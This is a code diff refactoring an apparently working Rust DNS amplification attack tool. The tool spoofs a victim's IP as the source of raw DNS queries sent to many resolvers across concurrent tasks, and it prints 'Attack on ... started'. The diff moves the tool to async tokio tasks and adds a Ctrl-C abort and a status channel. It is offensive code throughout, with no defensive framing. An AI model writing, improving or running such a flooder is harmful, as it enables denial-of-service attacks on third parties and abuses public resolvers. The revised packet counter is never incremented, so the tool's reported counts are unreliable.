@@ -9,7 +9,7 @@ use std::io::{self, BufRead, BufReader, Error, ErrorKind};
 use std::mem::size_of;
 use std::net::{IpAddr, Ipv4Addr};
 use std::str::FromStr;
-use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::Arc;
 use std::time::Duration;
 use std::{mem, thread};
@@ -21,12 +21,13 @@ use pnet::packet::udp::MutableUdpPacket;
 use pnet::packet::Packet;
 
 use reqwest;
-use tokio;
+use tokio::sync::mpsc;
 use tokio::time::Instant;
+use tokio::{self, signal};
 
 use libc::{sendto, sockaddr, sockaddr_in, AF_INET, IPPROTO_RAW, SOCK_RAW};
 
-static mut PACKETS_SENT: u64 = 0;
+static PACKETS_SENT: AtomicUsize = AtomicUsize::new(0);
 
 fn colorize(text: &str, color: &str) -> String {
     let color = match color {
@@ -223,40 +224,52 @@ fn send_raw_packet(dst_ip: Ipv4Addr, packet: &[u8]) -> Result<(), Error> {
     Ok(())
 }
 
-fn amplify(
-    dns_servers: &Vec<String>,
-    domain: &str,
-    source_ip: &str,
+async fn amplify(
+    dns_servers: Vec<String>,
+    domain: String,
+    source_ip: String,
     source_port: u16,
-    record_type: &str,
+    record_type: String,
     aborted: Arc<AtomicBool>,
+    status_tx: mpsc::Sender<()>,
 ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
-    if aborted.load(Ordering::Relaxed) {
-        return Ok(());
-    }
-    let source_ip = match Ipv4Addr::from_str(source_ip) {
+    let source_ip = match Ipv4Addr::from_str(&source_ip) {
         Ok(ip) => ip,
         Err(_) => return Err("Invalid source IP address".into()),
     };
-    loop {
-        for dns_server in dns_servers {
-            let dns_server = match Ipv4Addr::from_str(dns_server) {
+
+    while !aborted.load(Ordering::Relaxed) {
+        for dns_server in &dns_servers {
+            if aborted.load(Ordering::Relaxed) {
+                break;
+            }
+            let dns_server = match Ipv4Addr::from_str(&dns_server) {
                 Ok(ip) => ip,
                 Err(_) => {
                     println!("Invalid DNS server address: {}", dns_server);
                     continue;
                 }
             };
-            match send_dns_query(dns_server, domain, source_ip, source_port, record_type) {
-                Ok(()) => unsafe {
-                    PACKETS_SENT += 1;
-                },
-                Err(_e) => {
-                    continue;
-                }
+            if let Err(e) =
+                send_dns_query(dns_server, &domain, source_ip, source_port, &record_type)
+            {
+                eprintln!("Failed to send DNS query: {}", e);
+                continue;
             }
+
+            status_tx.send(()).await?;
         }
     }
+
+    Ok(())
+}
+
+async fn status_update_task(mut status_rx: mpsc::Receiver<()>) {
+    while let Some(_) = status_rx.recv().await {
+        let count = PACKETS_SENT.load(Ordering::Relaxed);
+        println!("Packets sent: {}", count);
+    }
+    println!("Receiver disconnected; stopping status updates.");
 }
 
 #[derive(Parser, Debug)]
@@ -306,7 +319,6 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
 
     let args = Args::parse();
-
     let record_type = args.record_type.unwrap();
     let source_ip = args.target;
     let source_port = args.port;
@@ -325,7 +337,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     dns_servers = filter_ipv4_addresses(dns_servers);
 
     let aborted = Arc::new(AtomicBool::new(false));
-    let mut handles = vec![];
+    let start_time = Instant::now();
 
     println!(
         "Attack on {} started with {} threads...",
@@ -333,55 +345,76 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         colorize(&threads.to_string(), "red")
     );
 
-    let start_time = Instant::now();
-    let source_ip_clone = source_ip.clone();
-
-    thread::spawn(move || loop {
-        let elapsed_time = start_time.elapsed();
-        println!(
-            "Attack on {} running for {} seconds with {} packets sent...",
-            colorize(&source_ip_clone.to_string(), "green"),
-            colorize(&elapsed_time.as_secs().to_string(), "red"),
-            colorize(unsafe { &PACKETS_SENT.to_string() }, "red")
-        );
-        thread::sleep(Duration::from_secs(1));
-    });
+    let (status_tx, status_rx) = mpsc::channel(32);
+    let status_task = tokio::spawn(status_update_task(status_rx));
+    let mut amplify_tasks = Vec::with_capacity(threads as usize);
 
     for _ in 0..threads {
         let dns_servers = dns_servers.clone();
         let domain = domain.clone();
         let source_ip = source_ip.clone();
         let record_type = record_type.clone();
-        let aborted = aborted.clone();
+        let aborted = Arc::clone(&aborted);
+        let status_tx = status_tx.clone();
 
-        let handle = thread::spawn(move || {
-            let _ = amplify(
-                &dns_servers,
-                &domain,
-                &source_ip,
+        let task = tokio::spawn(async move {
+            if let Err(e) = amplify(
+                dns_servers,
+                domain,
+                source_ip,
                 source_port,
-                &record_type,
+                record_type,
                 aborted,
-            );
+                status_tx,
+            )
+            .await
+            {
+                eprintln!("Amplify task failed: {}", e);
+            }
         });
 
-        handles.push(handle);
+        amplify_tasks.push(task);
     }
 
-    if let Some(time) = time {
-        thread::sleep(Duration::from_secs(time));
-        aborted.store(true, Ordering::Relaxed);
-    } else {
-        for handle in handles {
-            handle.join().unwrap();
+    let aborted_clone = Arc::clone(&aborted);
+    let signal_task = tokio::spawn(async move {
+        signal::ctrl_c().await.expect("Failed to listen for ctrl-c");
+        aborted_clone.store(true, Ordering::Relaxed);
+    });
+
+    if let Some(duration) = time {
+        tokio::select! {
+            _ = tokio::time::sleep(Duration::from_secs(duration)) => {
+                aborted.store(true, Ordering::Relaxed);
+            }
+            _ = signal_task => {
+                aborted.store(true, Ordering::Relaxed);
+            }
         }
+    } else {
+        tokio::select! {
+            _ = signal_task => {
+                aborted.store(true, Ordering::Relaxed);
+            }
+        }
+    }
+
+    for task in amplify_tasks {
+        if let Err(e) = task.await {
+            eprintln!("Amplify task encountered an error: {:?}", e);
+        }
+    }
+
+    drop(status_tx);
+    if let Err(e) = status_task.await {
+        eprintln!("Status update task encountered an error: {:?}", e);
     }
 
     println!(
         "Attack on {} finished after {} seconds with {} packets sent.",
         colorize(&source_ip.to_string(), "green"),
         colorize(&start_time.elapsed().as_secs().to_string(), "red"),
-        colorize(unsafe { &PACKETS_SENT.to_string() }, "red")
+        colorize(&PACKETS_SENT.load(Ordering::Relaxed).to_string(), "red")
     );
 
     Ok(())
